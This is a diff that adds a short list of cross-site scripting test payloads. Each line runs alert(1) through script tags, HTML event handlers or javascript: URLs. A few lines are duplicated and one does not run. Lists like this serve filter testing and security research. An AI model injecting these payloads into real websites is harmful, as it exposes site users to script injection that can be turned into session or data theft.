@@ -1,0 +1,24 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+<iframe src="javascript:alert(1)"></iframe>
+<input type="image" src="javascript:alert(1)">
+<isindex action="javascript:alert(1)" type=image>
+<marquee onstart=alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<object data="javascript:alert(1)"></object>
+<p><script>alert(1)</script></p>
+<textarea><script>alert(1)</script></textarea>
+<video><source onerror="alert(1)"></video>
+<math><mtext></mtext><menclose notation="circle"><mtext>alert(1)</mtext></menclose></math>
+<form action="javascript:alert(1)"><input type=submit value=XSS>
+<button onclick="alert(1)">XSS</button>
+<details open ontoggle=alert(1)>
+<embed src="javascript:alert(1)">
+<style>@keyframes x{}</style><x style="animation-name:x" onanimationend="alert(1)"></x>
